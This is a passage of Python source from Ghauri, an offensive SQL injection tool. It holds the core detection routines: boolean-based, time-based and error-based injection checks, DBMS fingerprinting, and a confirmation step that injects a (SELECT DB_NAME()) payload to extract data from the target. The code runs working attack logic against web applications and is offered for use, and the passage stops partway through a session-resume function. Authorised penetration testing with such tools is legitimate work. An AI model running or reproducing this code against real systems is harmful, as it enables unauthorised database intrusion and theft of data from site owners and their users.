#!/usr/bin/python3
# -*- coding: utf-8 -*-
# pylint: disable=R,W,E,C

"""

Author  : Nasir Khan (r0ot h3x49)
Github  : https://github.com/r0oth3x49
License : MIT


Copyright (c) 2016-2025 Nasir Khan (r0ot h3x49)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the
Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software,
and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR
ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH 
THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

"""
import random
from ghauri.common.colors import nc, mc
from ghauri.core.request import request
from ghauri.common.session import session
from ghauri.logger.colored_logger import logger
from ghauri.core.inject import inject_expression
from ghauri.common.payloads import (
    TEMPLATE_INJECTED_MESSAGE,
    REGEX_GENERIC,
    REGEX_MSSQL_STRING,
)
from ghauri.common.lib import (
    re,
    time,
    json,
    quote,
    unquote,
    collections,
    PAYLOAD_STATEMENT,
)
from ghauri.dbms.fingerprint import FingerPrintDBMS
from ghauri.common.utils import (
    urlencode,
    urldecode,
    search_regex,
    to_dbms_encoding,
    prepare_attack_request,
    check_boolean_responses,
    check_booleanbased_tests,
    fetch_db_specific_payload,
    get_filtered_page_content,
    search_possible_dbms_errors,
    fetch_payloads_by_suffix_prefix,
    get_payloads_with_functions,
)


def basic_check(
    url="",
    data="",
    headers="",
    proxy="",
    timeout=30,
    batch=False,
    parameter=None,
    injection_type="",
    is_multipart=False,
    is_resumed=False,
    techniques="",
    is_json=False,
):
    is_dynamic = False
    param_name = ""
    expression = "'\"..))"
    if is_multipart:
        param_name += "MULTIPART "
    if is_json:
        param_name += "JSON "
    param_name += parameter.get("key")
    Response = collections.namedtuple(
        "BasicCheckResponse",
        ["base", "possible_dbms", "is_connection_tested", "is_dynamic"],
    )
    _possible_dbms = None
    try:
        logger.notice("testing connection to the target URL")
        base = request.perform(
            url=url,
            data=data,
            proxy=proxy,
            headers=headers,
            connection_test=True,
            is_multipart=is_multipart,
            timeout=timeout,
        )
        if not is_resumed:
            logger.info("testing if the target URL content is stable")
            time.sleep(0.5)
            resp = request.perform(
                url=url,
                data=data,
                proxy=proxy,
                headers=headers,
                connection_test=True,
                is_multipart=is_multipart,
                timeout=timeout,
            )
            logger.debug(f"r1: {base.content_length}, r2: {resp.content_length}")
            baseSet = set(base.filtered_text.split("\n"))
            respSet = set(resp.filtered_text.split("\n"))
            is_stable = bool(baseSet == respSet)
            if is_stable:
                logger.info("target URL content is stable")
            else:
                is_dynamic = True
                warnMsg = "target URL content is not stable (i.e. content differs). Ghauri will base the page "
                warnMsg += "comparison on a textual content, Switching to 'text-only'"  # . If no dynamic nor "
                # warnMsg += "injectable parameters are detected, or in case of "
                # warnMsg += "junk results, refer to user's manual paragraph "
                # warnMsg += "'Page comparison'"
                logger.warning(warnMsg)
                # choice = logger.read_input(
                #     "how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] ",
                #     batch=batch,
                #     user_input="C",
                # )
                # if choice == "c":
                #     pass
    except KeyboardInterrupt:
        logger.error("user quit")
        logger.end("ending")
        exit(0)
    except Exception as error:
        logger.critical(
            f"Ghauri was not able to establish connection. try checking with -v set to 5. error '{error}' occured."
        )
        logger.end("ending")
        exit(0)
    if not is_resumed:
        param_name = f"{mc}{param_name}{nc}"
        attack = inject_expression(
            url=url,
            data=data,
            proxy=proxy,
            headers=headers,
            parameter=parameter,
            expression=expression,
            is_multipart=is_multipart,
            injection_type=injection_type,
        )
        html = get_filtered_page_content(attack.text) if is_dynamic else attack.text
        retval = search_possible_dbms_errors(html=attack.text)
        if retval.possible_dbms:
            _possible_dbms = retval.possible_dbms
            possible_dbms = f"{mc}{_possible_dbms}{nc}"
            logger.notice(
                f"heuristic (basic) test shows that {injection_type} parameter '{param_name}' might be injectable (possible DBMS: '{possible_dbms}')"
            )
            _tech = (
                f"{mc}--technique='E{techniques}'{nc}"
                if "E" not in techniques
                else None
            )
            if _tech:
                logger.notice(
                    f"Ghauri is going to set {_tech} as heuristic (basic) detected a possible DBMS '{possible_dbms}' from SQL error message"
                )
        else:
            logger.notice(
                f"heuristic (basic) test shows that {injection_type} parameter '{param_name}' might not be injectable"
            )
    return Response(
        base=base,
        possible_dbms=_possible_dbms,
        is_connection_tested=True,
        is_dynamic=is_dynamic,
    )


def extended_dbms_check(
    base,
    parameter,
    url="",
    data="",
    headers="",
    injection_type="",
    proxy="",
    batch=False,
    is_multipart=False,
    timeout=30,
    delay=0,
    timesec=5,
    vector="",
    backend="",
    attack="",
    code=None,
    match_string=None,
    not_match_string=None,
    text_only=False,
):
    _temp = ""
    inj = FingerPrintDBMS(
        base,
        parameter,
        url=url,
        data=data,
        headers=headers,
        injection_type=injection_type,
        proxy=proxy,
        batch=batch,
        is_multipart=is_multipart,
        timeout=timeout,
        delay=delay,
        timesec=timesec,
        vector=vector,
        attack=attack,
        code=code,
        match_string=match_string,
        not_match_string=not_match_string,
        text_only=text_only,
    )
    response = ""
    if backend == "MySQL":
        response = inj.check_mysql()
    if backend == "Oracle":
        response = inj.check_oracle()
    if backend == "Microsoft SQL Server":
        response = inj.check_mssql()
    if backend == "PostgreSQL":
        response = inj.check_postgre()
    if response:
        _temp = response
    return _temp


def confirm_booleanbased_sqli(
    base,
    parameter,
    payload_detected,
    url="",
    data="",
    headers="",
    injection_type="",
    proxy="",
    is_multipart=False,
    timeout=30,
    delay=0,
    timesec=5,
    response_time=8,
    match_string=None,
):
    _temp = []
    Response = collections.namedtuple("Response", ["vulnerable", "tests_performed"])
    param_key = parameter.get("key")
    param_value = parameter.get("value")
    test_payloads = [
        {
            "true": {"payload": "2*3*8=6*8", "response": True},
            "false": {"payload": "2*3*8=6*9", "response": False},
        },
        {
            "true": {"payload": "3*2>(1*5)", "response": True},
            "false": {"payload": "3*3<(2*4)", "response": False},
        },
        {
            "true": {"payload": "3*2*0>=0", "response": True},
            "false": {"payload": "3*3*9<(2*4)", "response": False},
        },
        {
            "true": {"payload": "5*4=20", "response": True},
            "false": {"payload": "5*4=21", "response": False},
        },
        {
            "true": {"payload": "3*2*1=6", "response": True},
            "false": {"payload": "3*2*0=6", "response": False},
        },
    ]
    if response_time > 8:
        test_payloads = test_payloads[0:3]
    for entry in test_payloads:
        if delay > 0:
            time.sleep(delay)
        condition_true = entry.get("true", {}).get("payload")
        condition_false = entry.get("false", {}).get("payload")
        condition_response_0 = entry.get("true", {}).get("response")
        condition_response_1 = entry.get("false", {}).get("response")
        string = payload_detected.string
        expression = string.replace("[RANDNUM]=[RANDNUM]", condition_true)
        expression01 = string.replace("[RANDNUM]=[RANDNUM]", condition_false)
        decoded_expression = urldecode(expression)
        decoded_expression01 = urldecode(expression01)
        logger.payload(f"{decoded_expression}")
        try:
            attack = inject_expression(
                url=url,
                data=data,
                proxy=proxy,
                delay=delay,
                timesec=timesec,
                timeout=timeout,
                headers=headers,
                parameter=parameter,
                expression=expression,
                is_multipart=is_multipart,
                injection_type=injection_type,
            )
            attack01 = inject_expression(
                url=url,
                data=data,
                proxy=proxy,
                delay=delay,
                timesec=timesec,
                timeout=timeout,
                headers=headers,
                parameter=parameter,
                expression=expression01,
                is_multipart=is_multipart,
                injection_type=injection_type,
            )
            confirm_response_type, case, _ = check_boolean_responses(
                base, attack, attack01, match_string=match_string
            )
            if confirm_response_type:
                logger.debug(
                    "  Test: {}, Response Type {}".format(
                        decoded_expression, str(condition_response_0)
                    )
                )
                logger.debug(
                    "  Test: {}, Response Type {}".format(
                        decoded_expression01, str(condition_response_1)
                    )
                )
                _temp.append(
                    {
                        "payload": "{}{}".format(param_value, decoded_expression),
                        "response_type": condition_response_0,
                        "attack": attack,
                    }
                )
                _temp.append(
                    {
                        "payload": "{}{}".format(param_value, decoded_expression01),
                        "response_type": condition_response_1,
                        "attack": attack01,
                    }
                )
        except KeyboardInterrupt as error:
            logger.warning("user aborted during boolean-based confirmation phase")
            break
        except Exception as error:
            logger.critical(f"error {error}, during time-based confirmation phase.")
            break
    if len(_temp) >= 8:
        vulnerable = check_booleanbased_tests(_temp)
    else:
        if response_time > 8:
            if len(_temp) >= 4:
                vulnerable = check_booleanbased_tests(_temp)
            else:
                vulnerable = False
        else:
            vulnerable = False
    ok = Response(vulnerable=vulnerable, tests_performed=_temp)
    return ok


def check_booleanbased_sqli(
    base,
    parameter,
    url="",
    data="",
    headers="",
    injection_type="",
    proxy="",
    batch=False,
    is_multipart=False,
    timeout=30,
    delay=0,
    timesec=5,
    prefix=None,
    suffix=None,
    possible_dbms=None,
    is_json=False,
    retry=3,
    code=None,
    match_string=None,
    not_match_string=None,
    text_only=False,
):
    Response = collections.namedtuple(
        "SQLi",
        [
            "url",
            "data",
            "path",
            "title",
            "param",
            "vector",
            "payload",
            "base",
            "prefix",
            "suffix",
            "attacks",
            "injection_type",
            "response_time",
            "injected",
            "case",
            "prepared_vector",
            "number_of_requests",
            "backend",
            "payload_type",
            "string",
            "payload_raw",
        ],
    )
    blind_payloads = fetch_db_specific_payload(booleanbased_only=True)
    param_key = parameter.get("key")
    param_value = parameter.get("value")
    is_injected = False
    injection_type = injection_type.upper()
    requests_counter = 1
    end_detection_phase = False
    for entry in blind_payloads:
        index_of_payload = 0
        retry_on_error = 0
        payloads = fetch_payloads_by_suffix_prefix(
            payloads=entry.payloads, prefix=prefix, suffix=suffix
        )
        total_payloads = len(payloads)
        logger.info(f"testing '{entry.title}'")
        while index_of_payload < total_payloads:
            payload = payloads[index_of_payload]
            if retry_on_error >= retry:
                logger.critical(f"terminating test phase due to multiple errors..")
                logger.end("ending")
                exit(0)
            if delay > 0:
                time.sleep(delay)
            random_boolean = random.randint(1234, 9999)
            string = payload.string
            expression = string.replace(
                "[RANDNUM]=[RANDNUM]",
                "{:05}={:05}".format(random_boolean, random_boolean),
            )
            expression01 = string.replace(
                "[RANDNUM]=[RANDNUM]",
                "{:05}={:05}".format(random_boolean, random_boolean - 68),
            )
            logger.payload(f"{expression}")
            try:
                attack = inject_expression(
                    url=url,
                    data=data,
                    proxy=proxy,
                    delay=delay,
                    timesec=timesec,
                    timeout=timeout,
                    headers=headers,
                    parameter=parameter,
                    expression=expression,
                    is_multipart=is_multipart,
                    injection_type=injection_type,
                )
                attack01 = inject_expression(
                    url=url,
                    data=data,
                    proxy=proxy,
                    delay=delay,
                    timesec=timesec,
                    timeout=timeout,
                    headers=headers,
                    parameter=parameter,
                    expression=expression01,
                    is_multipart=is_multipart,
                    injection_type=injection_type,
                )
                index_of_payload += 1
                retry_on_error = 0
            except KeyboardInterrupt:
                logger.warning("user aborted during detection phase")
                quest = logger.read_input(
                    "how do you want to proceed? [(S)kip current test/(e)nd detection phase/(n)ext parameter/(q)uit] ",
                    batch=False,
                    user_input="S",
                )
                if quest and quest == "n":
                    return None
                if quest and quest == "q":
                    logger.error("user quit")
                    logger.end("ending")
                    exit(0)
                if quest and quest == "e":
                    end_detection_phase = True
                if quest and quest == "s":
                    break
            except ConnectionAbortedError as e:
                logger.critical(
                    f"connection attempt to the target URL was aborted by the peer, Ghauri is going to retry"
                )
                retry_on_error += 1
            except ConnectionRefusedError as e:
                logger.critical(
                    f"connection attempt to the target URL was refused by the peer. Ghauri is going to retry"
                )
                retry_on_error += 1
            except ConnectionResetError as e:
                logger.critical(
                    f"connection attempt to the target URL was reset by the peer. Ghauri is going to retry"
                )
                retry_on_error += 1
            except Exception as error:
                logger.critical(
                    f"error {error}, during detection phase. Ghauri is going to retry"
                )
                retry_on_error += 1
            requests_counter += 1
            retval, case, diff = check_boolean_responses(
                base,
                attack,
                attack01,
                code=code,
                match_string=match_string,
                not_match_string=not_match_string,
                text_only=text_only,
            )
            if not retval and end_detection_phase:
                return None
            with_status_code_msg = ""
            with_status_code = attack.status_code
            if attack.status_code != attack01.status_code:
                is_different_status_code_injectable = True
                if with_status_code == 4001:
                    with_status_code_msg = (
                        f" (with error ReadTimeout on --timeout={timeout})"
                    )
                else:
                    with_status_code_msg = f" (with --code={with_status_code})"
            if case == "Page Ratio":
                with_status_code_msg = f' (with --string="{diff}")'
            if retval:
                is_injected = True
                if is_multipart:
                    message = f"(custom) {injection_type} parameter '{mc}MULTIPART {param_key}{nc}' appears to be '{mc}{entry.title}{nc}' injectable{with_status_code_msg}"
                elif is_json:
                    message = f"(custom) {injection_type} parameter '{mc}JSON {param_key}{nc}' appears to be '{mc}{entry.title}{nc}' injectable{with_status_code_msg}"
                else:
                    message = f"{injection_type} parameter '{mc}{param_key}{nc}' appears to be '{mc}{entry.title}{nc}' injectable{with_status_code_msg}"
                logger.notice(message)
                if not possible_dbms:
                    inj = FingerPrintDBMS(
                        base,
                        parameter,
                        url=url,
                        data=data,
                        headers=headers,
                        injection_type=injection_type,
                        proxy=proxy,
                        batch=batch,
                        is_multipart=is_multipart,
                        timeout=timeout,
                        delay=delay,
                        timesec=timesec,
                        vector=f"{payload.prefix}{entry.vector}{payload.suffix}",
                        attacks=[attack, attack01],
                        code=code,
                        match_string=match_string,
                        not_match_string=not_match_string,
                        text_only=text_only,
                    )
                    response_dbms = inj.check_mysql(heuristic_backend_check=True)
                    if not response_dbms:
                        response_dbms = inj.check_oracle(heuristic_backend_check=True)
                    if not response_dbms:
                        response_dbms = inj.check_mssql(heuristic_backend_check=True)
                    if not response_dbms:
                        response_dbms = inj.check_postgre(heuristic_backend_check=True)
                    if response_dbms:
                        backend = response_dbms
                    if not response_dbms:
                        logger.debug(
                            "Ghauri could not determine the backend DBMS, detected payload is false positive, performing further tests.."
                        )
                        logger.debug(
                            "false positive payload detected, continue testing remaining payloads.."
                        )
                        continue
                if possible_dbms and not backend:
                    backend = possible_dbms
                # message = None
                # if backend:
                #     message = f"heuristic (extended) test shows that the back-end DBMS could be '{mc}{backend}{nc}'"
                # if not possible_dbms and message:
                #     logger.notice(message)
                # if not possible_dbms:
                #     inj = FingerPrintDBMS(
                #         base,
                #         parameter,
                #         url=url,
                #         data=data,
                #         headers=headers,
                #         injection_type=injection_type,
                #         proxy=proxy,
                #         batch=batch,
                #         is_multipart=is_multipart,
                #         timeout=timeout,
                #         delay=delay,
                #         timesec=timesec,
                #         vector=f"{payload.prefix}{entry.vector}{payload.suffix}",
                #         attacks=[attack, attack01],
                #         code=code,
                #         match_string=match_string,
                #         not_match_string=not_match_string,
                #         text_only=text_only,
                #     )
                #     response_dbms = inj.check_mysql(heuristic_backend_check=True)
                #     if not response_dbms:
                #         response_dbms = inj.check_oracle(heuristic_backend_check=True)
                #     if not response_dbms:
                #         response_dbms = inj.check_mssql(heuristic_backend_check=True)
                #     if not response_dbms:
                #         response_dbms = inj.check_postgre(heuristic_backend_check=True)
                #     if response_dbms:
                #         backend = response_dbms
                _url = attack.request_url if injection_type == "GET" else attack.url
                _temp = Response(
                    url=_url,
                    data=attack.data,
                    path=attack.path,
                    title=entry.title,
                    param=parameter,
                    vector=entry.vector,
                    payload=expression,
                    base=base,
                    prefix=payload.prefix,
                    suffix=payload.suffix,
                    attacks=[attack, attack01],
                    injection_type=injection_type,
                    response_time=attack.response_time,
                    injected=is_injected,
                    case=case,
                    prepared_vector=f"{payload.prefix}{entry.vector}{payload.suffix}",
                    number_of_requests=requests_counter,
                    backend=backend,
                    payload_type="boolean-based blind",
                    string=diff,
                    payload_raw=payload,
                )
                return _temp
    return None


def confirm_timebased_sqli(
    base,
    parameter,
    payload_detected,
    injected_sleep_time,
    detected_response_time,
    url="",
    data="",
    headers="",
    injection_type="",
    proxy="",
    with_status_code=200,
    is_different_status_code_injectable=False,
    is_multipart=False,
    timeout=30,
    delay=0,
    timesec=5,
    is_boolean_confirmed=False,
):
    _temp = []
    TEST_CASES_COUNT = 5
    if is_boolean_confirmed:
        TEST_CASES_COUNT = 1
    Response = collections.namedtuple("Response", ["vulnerable", "tests_performed"])
    param_key = parameter.get("key")
    param_value = parameter.get("value")
    sleep_times = [i for i in range(0, 10) if i != injected_sleep_time]
    for _ in range(10):
        random.shuffle(sleep_times)
    for _ in range(TEST_CASES_COUNT):
        if delay > 0:
            time.sleep(delay)
        sleep_time = sleep_times.pop()
        string = payload_detected.string
        expression = string.replace("[SLEEPTIME]", "%s" % (sleep_time))
        decoded_expression = urldecode(expression)
        logger.payload(f"{decoded_expression}")
        try:
            attack = inject_expression(
                url=url,
                data=data,
                proxy=proxy,
                delay=delay,
                timesec=timesec,
                timeout=timeout,
                headers=headers,
                parameter=parameter,
                expression=expression,
                is_multipart=is_multipart,
                injection_type=injection_type,
            )
            response_time = attack.response_time
            if is_different_status_code_injectable:
                condition_confirm_status_code = with_status_code
            else:
                condition_confirm_status_code = base.status_code
            if (
                response_time >= sleep_time
                and response_time != detected_response_time
                and attack.status_code == condition_confirm_status_code
            ):
                logger.debug(
                    "  Test: {}, Response Time {}".format(
                        decoded_expression, str(response_time)
                    )
                )
                _temp.append(
                    {
                        "payload": decoded_expression,
                        "response_time": response_time,
                    }
                )
        except KeyboardInterrupt as error:
            logger.warning("user aborted during time-based confirmation phase.")
            break
        except Exception as error:
            logger.critical(f"error {error}, during time-based confirmation phase.")
            break
    vulnerable = bool(TEST_CASES_COUNT == len(_temp))
    ok = Response(vulnerable=vulnerable, tests_performed=_temp)
    return ok


def check_timebased_sqli(
    base,
    parameter,
    url="",
    data="",
    proxy="",
    headers="",
    injection_type="",
    batch=False,
    is_multipart=False,
    timeout=30,
    delay=0,
    timesec=5,
    dbms=None,
    prefix=None,
    suffix=None,
    is_json=False,
    retry=3,
):
    Response = collections.namedtuple(
        "SQLi",
        [
            "url",
            "data",
            "path",
            "title",
            "param",
            "vector",
            "payload",
            "base",
            "prefix",
            "suffix",
            "attacks",
            "injection_type",
            "sleep_time",
            "response_time",
            "injected",
            "prepared_vector",
            "number_of_requests",
            "backend",
            "payload_type",
            "payload_raw",
            "with_status_code",
            "is_different_status_code_injectable",
        ],
    )
    time_based_payloads = fetch_db_specific_payload(
        dbms=dbms, timebased_only=True, booleanbased_only=False
    )
    param_key = parameter.get("key")
    param_value = parameter.get("value")
    sleep_time = random.randint(5, 9)
    injection_type = injection_type.upper()
    is_injected = False
    requests_counter = 1
    end_detection_phase = False
    is_different_status_code_injectable = False
    for entry in time_based_payloads:
        backend = entry.dbms
        index_of_payload = 0
        retry_on_error = 0
        payloads = fetch_payloads_by_suffix_prefix(
            payloads=entry.payloads, prefix=prefix, suffix=suffix
        )
        total_payloads = len(payloads)
        logger.info(f"testing '{entry.title}'")
        while index_of_payload < total_payloads:
            _payload = payloads[index_of_payload]
            if retry_on_error >= retry:
                logger.critical(f"terminating test phase due to multiple errors..")
                logger.end("ending")
                exit(0)
            if delay > 0:
                time.sleep(delay)
            string = _payload.string
            expression = string.replace("[SLEEPTIME]", "%s" % (sleep_time))
            decoded_expression = urldecode(expression)
            logger.payload(f"{decoded_expression}")
            try:
                attack = inject_expression(
                    url=url,
                    data=data,
                    proxy=proxy,
                    delay=delay,
                    timesec=timesec,
                    timeout=timeout,
                    headers=headers,
                    parameter=parameter,
                    expression=expression,
                    is_multipart=is_multipart,
                    injection_type=injection_type,
                )
                index_of_payload += 1
                retry_on_error = 0
            except KeyboardInterrupt:
                logger.warning("user aborted during detection phase")
                quest = logger.read_input(
                    "how do you want to proceed? [(S)kip current test/(e)nd detection phase/(n)ext parameter/(q)uit] ",
                    batch=False,
                    user_input="S",
                )
                if quest and quest == "n":
                    return None
                if quest and quest == "q":
                    logger.error("user quit")
                    logger.end("ending")
                    exit(0)
                if quest and quest == "e":
                    end_detection_phase = True
                if quest and quest == "s":
                    break
            except ConnectionAbortedError as e:
                logger.critical(
                    f"connection attempt to the target URL was aborted by the peer, Ghauri is going to retry"
                )
                retry_on_error += 1
            except ConnectionRefusedError as e:
                logger.critical(
                    f"connection attempt to the target URL was refused by the peer. Ghauri is going to retry"
                )
                retry_on_error += 1
            except ConnectionResetError as e:
                logger.critical(
                    f"connection attempt to the target URL was reset by the peer. Ghauri is going to retry"
                )
                retry_on_error += 1
            except Exception as error:
                logger.critical(
                    f"error {error}, during detection phase. Ghauri is going to retry"
                )
                retry_on_error += 1
            response_time = attack.response_time
            if response_time < sleep_time and end_detection_phase:
                return None
            requests_counter += 1
            with_status_code_msg = ""
            with_status_code = attack.status_code
            if attack.status_code != base.status_code:
                is_different_status_code_injectable = True
                if with_status_code == 4001:
                    with_status_code_msg = (
                        f" (with error ReadTimeout on --timeout={timeout})"
                    )
                else:
                    with_status_code_msg = f" (with --code={with_status_code})"
            if response_time >= sleep_time:
                is_injected = True
                if is_multipart:
                    message = f"(custom) {injection_type} parameter '{mc}MULTIPART {param_key}{nc}' appears to be '{mc}{entry.title}{nc}' injectable{with_status_code_msg}"
                elif is_json:
                    message = f"(custom) {injection_type} parameter '{mc}JSON {param_key}{nc}' appears to be '{mc}{entry.title}{nc}' injectable{with_status_code_msg}"
                else:
                    message = f"{injection_type} parameter '{mc}{param_key}{nc}' appears to be '{mc}{entry.title}{nc}' injectable{with_status_code_msg}"
                logger.notice(message)
                _url = attack.request_url if injection_type == "GET" else attack.url
                _temp = Response(
                    url=_url,
                    data=attack.data,
                    path=attack.path,
                    title=entry.title,
                    param=parameter,
                    payload=expression,
                    base=base._asdict(),
                    prefix=_payload.prefix,
                    suffix=_payload.suffix,
                    vector=entry.vector,
                    attacks=attack._asdict(),
                    injection_type=injection_type,
                    sleep_time=sleep_time,
                    response_time=response_time,
                    injected=is_injected,
                    prepared_vector=f"{_payload.prefix}{entry.vector}{_payload.suffix}",
                    number_of_requests=requests_counter,
                    backend=backend,
                    payload_type="time-based blind",
                    payload_raw=_payload,
                    with_status_code=with_status_code,
                    is_different_status_code_injectable=is_different_status_code_injectable,
                )
                return _temp
    return None


def check_errorbased_sqli(
    base,
    parameter,
    url="",
    data="",
    proxy="",
    headers="",
    injection_type="",
    batch=False,
    is_multipart=False,
    timeout=30,
    delay=0,
    timesec=5,
    dbms=None,
    prefix=None,
    suffix=None,
    is_json=False,
    retry=3,
    possible_dbms=None,
):
    Response = collections.namedtuple(
        "SQLi",
        [
            "url",
            "data",
            "path",
            "title",
            "param",
            "vector",
            "payload",
            "base",
            "prefix",
            "suffix",
            "attacks",
            "injection_type",
            "response_time",
            "confirmed",
            "injected",
            "prepared_vector",
            "number_of_requests",
            "backend",
            "payload_type",
            "is_string",
        ],
    )
    error_based_payloads = fetch_db_specific_payload(dbms=dbms, error_based_only=True)
    param_key = parameter.get("key")
    param_value = parameter.get("value")
    sleep_time = random.randint(5, 9)
    injection_type = injection_type.upper()
    is_injected = False
    requests_counter = 1
    is_string = False
    end_detection_phase = False
    is_different_status_code_injectable = False
    error_based_payloads = get_payloads_with_functions(
        error_based_payloads, backend=dbms, possible_dbms=possible_dbms
    )
    for entry in error_based_payloads:
        backend = entry.dbms
        index_of_payload = 0
        retry_on_error = 0
        payloads = fetch_payloads_by_suffix_prefix(
            payloads=entry.payloads, prefix=prefix, suffix=suffix
        )
        total_payloads = len(payloads)
        logger.info(f"testing '{entry.title}'")
        while index_of_payload < total_payloads:
            _payload = payloads[index_of_payload]
            if retry_on_error >= retry:
                logger.critical(f"terminating test phase due to multiple errors..")
                logger.end("ending")
                exit(0)
            if delay > 0:
                time.sleep(delay)
            expression = _payload.string
            decoded_expression = urldecode(expression)
            logger.payload(f"{decoded_expression}")
            try:
                attack = inject_expression(
                    url=url,
                    data=data,
                    proxy=proxy,
                    delay=delay,
                    timesec=timesec,
                    timeout=timeout,
                    headers=headers,
                    parameter=parameter,
                    expression=expression,
                    is_multipart=is_multipart,
                    injection_type=injection_type,
                )
                index_of_payload += 1
                retry_on_error = 0
            except KeyboardInterrupt:
                logger.warning("user aborted during detection phase")
                quest = logger.read_input(
                    "how do you want to proceed? [(S)kip current test/(e)nd detection phase/(n)ext parameter/(q)uit] ",
                    batch=False,
                    user_input="S",
                )
                if quest and quest == "n":
                    return None
                if quest and quest == "q":
                    logger.error("user quit")
                    logger.end("ending")
                    exit(0)
                if quest and quest == "e":
                    end_detection_phase = True
                if quest and quest == "s":
                    break
            except ConnectionAbortedError as e:
                logger.critical(
                    f"connection attempt to the target URL was aborted by the peer, Ghauri is going to retry"
                )
                retry_on_error += 1
            except ConnectionRefusedError as e:
                logger.critical(
                    f"connection attempt to the target URL was refused by the peer. Ghauri is going to retry"
                )
                retry_on_error += 1
            except ConnectionResetError as e:
                logger.critical(
                    f"connection attempt to the target URL was reset by the peer. Ghauri is going to retry"
                )
                retry_on_error += 1
            except Exception as error:
                logger.critical(
                    f"error {error}, during detection phase. Ghauri is going to retry"
                )
                retry_on_error += 1
            mobj = re.search(r"(?is)(?:r0oth3(?:x49)?)", attack.text)
            response_time = attack.response_time
            if mobj and end_detection_phase:
                return None
            requests_counter += 1
            with_status_code_msg = ""
            with_status_code = attack.status_code
            if attack.status_code != base.status_code:
                is_different_status_code_injectable = True
                with_status_code_msg = f" (with --code={with_status_code})"
            if mobj:
                if "string error-based" in entry.title:
                    logger.debug(
                        "confirmating if target is actually exploiable or not.."
                    )
                    _pv = f"{_payload.prefix}{entry.vector}{_payload.suffix}"
                    _expression = _pv.replace("[INFERENCE]", "(SELECT%20DB_NAME())")
                    logger.payload(f"{urldecode(_expression)}")
                    try:
                        _attack = inject_expression(
                            url=url,
                            data=data,
                            proxy=proxy,
                            delay=delay,
                            timesec=timesec,
                            timeout=timeout,
                            headers=headers,
                            parameter=parameter,
                            expression=_expression,
                            is_multipart=is_multipart,
                            injection_type=injection_type,
                        )
                        retval_confirm = search_regex(
                            pattern=(
                                r"(?isx)(?:(?:r0oth3x49|START)~(?P<error_based_response>.*?)\~END)",
                                REGEX_GENERIC,
                                REGEX_MSSQL_STRING,
                            ),
                            string=_attack.text,
                            group="error_based_response",
                            default=None,
                        )
                        if retval_confirm and retval_confirm != "<blank_value>":
                            is_string = True
                            logger.debug(
                                f"reflective value found in response, filtering out"
                            )
                            logger.debug(f"retrieved: '{retval_confirm}'")
                        else:
                            logger.debug(
                                "false positive payload detected, continue testing more.."
                            )
                            continue
                    except KeyboardInterrupt:
                        logger.warning(
                            "user aborted during string error-based 'Microsoft SQL Server' injection confirmation"
                        )
                        continue
                        # logger.end("ending")
                        # exit(0)
                    except Exception as error:
                        logger.critical(
                            f"error {error}, during string error-based 'Microsoft SQL Server' injection confirmation.."
                        )
                        continue
                        # logger.end("ending")
                        # exit(0)
                if is_multipart:
                    message = f"(custom) {injection_type} parameter '{mc}MULTIPART {param_key}{nc}' appears to be '{mc}{entry.title}{nc}' injectable{with_status_code_msg}"
                elif is_json:
                    message = f"(custom) {injection_type} parameter '{mc}JSON {param_key}{nc}' appears to be '{mc}{entry.title}{nc}' injectable{with_status_code_msg}"
                else:
                    message = f"{injection_type} parameter '{mc}{param_key}{nc}' appears to be '{mc}{entry.title}{nc}' injectable{with_status_code_msg}"
                logger.notice(message)
                _url = attack.request_url if injection_type == "GET" else attack.url
                _temp = Response(
                    url=_url,
                    data=attack.data,
                    path=attack.path,
                    title=entry.title,
                    param=parameter,
                    payload=expression,
                    base=base._asdict(),
                    prefix=_payload.prefix,
                    suffix=_payload.suffix,
                    vector=entry.vector,
                    attacks=attack._asdict(),
                    injection_type=injection_type,
                    response_time=response_time,
                    confirmed=True,
                    injected=is_injected,
                    prepared_vector=f"{_payload.prefix}{entry.vector}{_payload.suffix}",
                    number_of_requests=requests_counter,
                    backend=backend,
                    payload_type="error-based",
                    is_string=is_string,
                )
                return _temp
    return None


def check_session(
    url="",
    data="",
    base="",
    proxy="",
    delay="",
    timesec="",
    timeout=30,
    headers="",
    parameter="",
    is_multipart=False,
    injection_type="",
    session_filepath="",
    is_json=False,
    code=None,
    match_string=None,
    not_match_string=None,
    text_only=False,
):
    retval = session.fetch_from_table(
        session_filepath=session_filepath, table_name="tbl_payload", cursor=False
    )
    Response = collections.namedtuple(
        "Session",
        [
            "vulnerable",
            "attack01",
            "match_string",
            "vectors",
            "injection_type",
            "param",
            "backend",
            "is_string",
        ],
    )
    vulnerable = False
    vectors = {}
    match_string = None
    attack_false = None
    __injecton_type = None
    param = None
    backend = None
    is_string = False
    is_boolean_vuln = False
    is_error_vuln = False
    to_str = False
    to_char = False
    if retval:
        message = (
            "Ghauri resumed the following injection point(s) from stored session:\n"
        )
        message += "---\n"
        parameter = json.loads(retval[-1].get("parameter", "{}"))
        param = parameter
        injection_type = retval[-1].get("injection_type")
        backend = retval[-1].get("backend")
        param_name = parameter.get("key")
        _p = f"{param_name}"
        _it = injection_type if param_name != "#1*" else "URI"
        if is_json:
            _p = f"JSON {param_name}"
            _it = f"(custom) {injection_type}"
        if is_multipart:
            _p = f"MULTIPART {param_name}"
            _it = f"(custom) {injection_type}"
        message += "Parameter: {} ({})".format(_p, _it)
        __ = []
        for entry in retval:
            _url = url
            _data = data
            injection_type = entry.get("injection_type")
            __injecton_type = injection_type
            param_name = parameter.get("key")
            param_value = parameter.get("value").replace("*", "")
            payload = entry.get("payload")
            payload_type = entry.get("payload_type")
            title = entry.get("title")
            vector = entry.get("vector")
            backend = entry.get("backend")
            if payload_type == "boolean-based blind":
                vectors.update({"boolean_vector": vector})
                logger.debug(
